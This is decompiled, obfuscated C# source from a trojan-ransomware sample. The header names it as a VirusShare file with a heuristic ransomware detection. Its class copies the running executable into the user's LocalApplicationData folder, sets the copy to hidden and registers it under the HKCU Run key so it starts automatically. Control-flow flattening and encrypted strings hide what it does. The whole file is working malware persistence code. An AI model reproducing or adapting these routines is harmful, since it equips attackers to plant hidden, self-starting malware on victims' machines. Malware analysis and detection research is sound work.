// Decompiled with JetBrains decompiler
// Type: browser_bastan.Araclar
// Assembly: Windows32, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C0E8C928-D720-4A30-9B2C-321D375113F4
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.Win32.Generic-93d412c942011fc44893e3e8d356461d9edcdae2759fc70a51026593df6d574b.exe

using eJnHnFFEpEmlCQmkVB;
using eYO1TM7iGlKLL86lCw;
using Microsoft.Win32;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace browser_bastan
{
  public class Araclar
  {
    private const string RegKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    private const int FEATURE_DISABLE_NAVIGATION_SOUNDS = 21;
    private const int SET_FEATURE_ON_PROCESS = 2;
    public static string Regkeyname;
    public static string DstName;

    [DllImport("urlmon.dll")]
    [return: MarshalAs(UnmanagedType.Error)]
    private static extern int CoInternetSetFeatureEnabled(
      int FeatureEntry,
      [MarshalAs(UnmanagedType.U4)] int dwFlags,
      bool fEnable);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void DisableClickSounds() => Araclar.CoInternetSetFeatureEnabled(21, 2, true);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void Copy(string src, string dst)
    {
      int num;
      if (Araclar.hle7cVAJxYYldT1ufff())
      {
        if (true)
        {
          num = 3;
          goto label_6;
        }
      }
      else
        goto label_3;
label_2:
      if (!Araclar.wrc7iYALZGtQtAHj4Xy((object) dst))
        goto label_8;
      else
        goto label_5;
label_3:
      num = 2;
      if (Araclar.sEOKNYAmGwfPWZYguuH())
        goto label_6;
      else
        goto label_6;
label_5:
      Araclar.CpCx5bAnPf2jjaBqxKX((object) dst, FileAttributes.Normal);
      goto label_8;
label_6:
      while (true)
      {
        switch (num)
        {
          case 0:
          case 3:
            goto label_2;
          case 1:
          case 2:
            goto label_5;
          case 4:
            goto label_8;
          case 5:
            goto label_4;
          default:
            num = 4;
            continue;
        }
      }
label_4:
      return;
label_8:
      try
      {
        Araclar.aB6iiIAYEu0C7vCU63u((object) src, (object) dst, true);
      }
      catch (Exception ex)
      {
      }
      Araclar.CpCx5bAnPf2jjaBqxKX((object) dst, FileAttributes.Hidden);
      num = 5;
      goto label_6;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void Startup(string name, string path)
    {
      Araclar.hle7cVAJxYYldT1ufff();
      int num = Araclar.sEOKNYAmGwfPWZYguuH() ? 5 : 2;
      RegistryKey registryKey;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            registryKey = (RegistryKey) Araclar.KD3YAdAZ1FLY2jbTdUg((object) Registry.CurrentUser, (object) empvh6dZSo5pSUG8BZ.eF0YZf0gO(1846), true);
            goto case 1;
          case 1:
          case 5:
            if (registryKey != null)
            {
              Araclar.PogXG2AkC2851aK2PuH((object) registryKey, (object) name, (object) path);
              goto case 4;
            }
            else
            {
              num = 3;
              continue;
            }
          case 3:
            goto label_9;
          case 4:
            Araclar.aCxIPpAbh0tfBZFIuBD((object) registryKey);
            num = 6;
            continue;
          case 6:
            goto label_1;
          default:
            num = 4;
            continue;
        }
      }
label_9:
      return;
label_1:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void DstCheck()
    {
      Araclar.sEOKNYAmGwfPWZYguuH();
      int num = !Araclar.hle7cVAJxYYldT1ufff() ? 4 : 2;
      string str1;
      string str2;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            str1 = (string) Araclar.eCfH1eA7UqJmWRN1PfA(Araclar.QMY5g2AekVsbwwQsVA1());
            goto case 1;
          case 1:
          case 4:
            str2 = (string) Araclar.AVvMNhA1WGv6KZnkD3W(Environment.SpecialFolder.LocalApplicationData);
            num = 5;
            continue;
          case 3:
            goto label_9;
          case 5:
            if (!Araclar.mLkt5eAR8esRTsayj5O(Araclar.x5Py4WA4UicRAoRpvJA((object) str1), (object) str2))
            {
              Araclar.Ef9mL8AIAlXUtyIeuxM((object) str1, Araclar.ee3TB5ASqaYq60JcZyy((object) str2, (object) empvh6dZSo5pSUG8BZ.eF0YZf0gO(1940), (object) Araclar.DstName));
              num = 6;
              continue;
            }
            goto label_2;
          case 6:
            goto label_6;
          default:
            num = 3;
            continue;
        }
      }
label_2:
      return;
label_6:
      return;
label_9:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Araclar()
    {
      Araclar.GASQGZAzkSvgPHZiZXp();
      Araclar.FnkP8xUH1rbQApXPukr((object) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    static Araclar()
    {
      Araclar.hle7cVAJxYYldT1ufff();
      int num = Araclar.sEOKNYAmGwfPWZYguuH() ? 4 : 2;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            Araclar.GASQGZAzkSvgPHZiZXp();
            goto case 1;
          case 1:
          case 4:
            Araclar.Regkeyname = empvh6dZSo5pSUG8BZ.eF0YZf0gO(1946);
            goto case 3;
          case 3:
            Araclar.DstName = empvh6dZSo5pSUG8BZ.eF0YZf0gO(1968);
            num = 5;
            continue;
          case 5:
            goto label_2;
          default:
            if (true)
            {
              num = 3;
              continue;
            }
            goto label_7;
        }
      }
label_2:
      return;
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool hle7cVAJxYYldT1ufff() => true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool sEOKNYAmGwfPWZYguuH() => false;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool wrc7iYALZGtQtAHj4Xy([In] object obj0) => File.Exists((string) obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void CpCx5bAnPf2jjaBqxKX([In] object obj0, [In] FileAttributes obj1) => File.SetAttributes((string) obj0, obj1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void aB6iiIAYEu0C7vCU63u([In] object obj0, [In] object obj1, [In] bool obj2) => File.Copy((string) obj0, (string) obj1, obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object KD3YAdAZ1FLY2jbTdUg([In] object obj0, [In] object obj1, [In] bool obj2) => (object) ((RegistryKey) obj0).OpenSubKey((string) obj1, obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void PogXG2AkC2851aK2PuH([In] object obj0, [In] object obj1, [In] object obj2) => ((RegistryKey) obj0).SetValue((string) obj1, obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void aCxIPpAbh0tfBZFIuBD([In] object obj0) => ((RegistryKey) obj0).Close();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object QMY5g2AekVsbwwQsVA1() => (object) Assembly.GetExecutingAssembly();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object eCfH1eA7UqJmWRN1PfA([In] object obj0) => (object) ((Assembly) obj0).Location;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object AVvMNhA1WGv6KZnkD3W([In] Environment.SpecialFolder obj0) => (object) Environment.GetFolderPath(obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object x5Py4WA4UicRAoRpvJA([In] object obj0) => (object) Path.GetDirectoryName((string) obj0);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static bool mLkt5eAR8esRTsayj5O([In] object obj0, [In] object obj1) => (string) obj0 == (string) obj1;

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static object ee3TB5ASqaYq60JcZyy([In] object obj0, [In] object obj1, [In] object obj2) => (object) ((string) obj0 + (string) obj1 + (string) obj2);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void Ef9mL8AIAlXUtyIeuxM([In] object obj0, [In] object obj1) => Araclar.Copy((string) obj0, (string) obj1);

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void GASQGZAzkSvgPHZiZXp() => eWK97ZHZd8El3E8K9m.tKioO6vz4Qs0e();

    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static void FnkP8xUH1rbQApXPukr([In] object obj0) => obj0.\u002Ector();
  }
}
